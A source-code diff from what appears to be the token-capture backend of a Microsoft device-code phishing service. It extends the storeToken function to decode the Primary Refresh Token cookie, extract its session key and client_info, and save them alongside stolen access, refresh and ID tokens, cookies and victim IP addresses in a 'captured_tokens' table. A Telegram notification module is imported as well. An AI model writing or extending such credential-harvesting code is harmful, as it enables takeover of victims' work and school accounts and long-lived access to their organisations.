@@ -12,6 +12,7 @@ const { encrypt, decrypt } = require('../utils/encrypt');
 const { sendTelegramDocument } = require('../services/notification');
 const proxyManager = require('../services/proxymanager');
 const cookieConverter = require('./cookieconverter');
+const { parsePrtClaims } = require('./kerberos');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -408,6 +409,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let prt = null;
     let sessionKeyJwe = null;
     let deviceTenantId = null;
+    let clientInfo = null;
 
     // For device code flow, refresh_token is the PRT for work/school accounts
     if (tokenData.refresh_token) {
@@ -419,12 +421,41 @@ async function storeToken(job, tokenData, responseCookies = []) {
       sessionKeyJwe = tokenData.session_key_enc;
     }
 
-    // Extract device_tenant_id from client_info
+    // Extract device_tenant_id from client_info in token response
     if (tokenData.client_info) {
       try {
-        const clientInfo = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
-        deviceTenantId = clientInfo.utid || null;
+        const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
+        deviceTenantId = clientInfoParsed.utid || null;
+        clientInfo = tokenData.client_info;
       } catch (e) { /* ignore */ }
+    }
+
+    // Decode PRT JWT from Set-Cookie headers (x-ms-RefreshTokenCredential)
+    // The PRT JWT contains: client_info, session_key, id_token, tid, uid
+    try {
+      const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
+      if (prtCookie && prtCookie.value) {
+        const prtClaims = parsePrtClaims(prtCookie.value);
+        if (prtClaims) {
+          // Extract client_info from PRT JWT (higher priority than token response)
+          if (prtClaims.client_info && !clientInfo) {
+            clientInfo = prtClaims.client_info;
+          }
+          // Extract device_tenant_id from PRT JWT client_info
+          if (prtClaims.client_info) {
+            try {
+              const ci = JSON.parse(Buffer.from(prtClaims.client_info, 'base64').toString());
+              deviceTenantId = ci.utid || deviceTenantId;
+            } catch (e) { /* ignore */ }
+          }
+          // Extract session_key from PRT JWT (overrides session_key_enc from token response)
+          if (prtClaims.session_key) {
+            sessionKeyJwe = prtClaims.session_key;
+          }
+        }
+      }
+    } catch (e) {
+      console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
     }
 
     // Determine account type from email domain (must be before INSERT)
@@ -444,7 +475,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
     const [result] = await db.query(
-       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
+       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, client_info, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
       [
         job.user_id,
@@ -455,6 +486,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
         encrypt(tokenData.refresh_token || null),
         encrypt(tokenData.id_token || null),
         encrypt(prt),
+        clientInfo,
         encrypt(sessionKeyJwe),
         deviceTenantId,
         cookiesEncrypted,
@@ -477,6 +509,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
       tenant,
       hasPrt: !!prt,
       hasIdToken: !!tokenData.id_token,
+      hasClientInfo: !!clientInfo,
+      hasSessionKeyJwe: !!sessionKeyJwe,
+      hasDeviceTenantId: !!deviceTenantId,
+      sessionKeySource: sessionKeyJwe ? (tokenData.session_key_enc ? 'token response (session_key_enc)' : 'PRT JWT (session_key)') : 'not extracted',
+      clientInfoSource: clientInfo ? (tokenData.client_info ? 'token response' : 'PRT JWT') : 'not extracted',
       idTokenTenant: idTokenTenant || 'not extracted'
     });
 
